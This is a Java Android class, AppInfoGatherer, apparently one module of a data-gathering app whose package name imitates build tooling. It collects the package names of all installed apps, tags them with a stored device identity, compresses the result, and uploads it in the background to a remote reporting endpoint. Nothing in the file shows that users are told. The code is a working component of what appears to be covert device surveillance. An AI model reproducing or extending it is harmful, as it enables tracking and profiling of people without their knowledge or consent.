package org.code.coregradle.gatherers;

import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;

import androidx.work.ListenableWorker;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;
import org.code.coregradle.config.ApiConfig;
import org.code.coregradle.config.IdentityStore;
import org.code.coregradle.utils.CompressionUtils;

import java.util.List;

import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class AppInfoGatherer implements InfoGatherer {
    private Context context;
    private OkHttpClient httpClient;
    private IdentityStore identityStore;

    @Override
    public void initGatherer(Context context) {
        this.context = context;
        this.httpClient = new OkHttpClient();
        this.identityStore = IdentityStore.getInstance(context);
    }

    @Override
    public JSONObject getRequestJSON() {
        JSONObject root = new JSONObject();
        try {
            root.put(this.identityStore.getIdentityKey(), this.identityStore.getIdentityValue());
            List<ApplicationInfo> appsInfo = context.getPackageManager().getInstalledApplications(PackageManager.GET_META_DATA);
            JSONArray appList = new JSONArray();
            for (ApplicationInfo appInfo : appsInfo) {
                appList.put(appInfo.packageName);
            }
            root.put("appList", appList);
        } catch (JSONException e) {

        }
        return root;
    }

    @Override
    public ListenableWorker.Result makeRequest() {
        try {
            JSONObject requestJSON = getRequestJSON();
            RequestBody requestBody = RequestBody.create(MediaType.get("application/json"), CompressionUtils.compress(requestJSON.toString()));
            Request request = new Request.Builder()
                    .url(ApiConfig.REPORT_APP_INFO)
                    .post(requestBody)
                    .build();
            Response response = httpClient.newCall(request).execute();
            if (response.isSuccessful()) {
                return ListenableWorker.Result.success();
            }
            return ListenableWorker.Result.retry();
        } catch (Exception e) {
            return ListenableWorker.Result.failure();
        }
    }
}
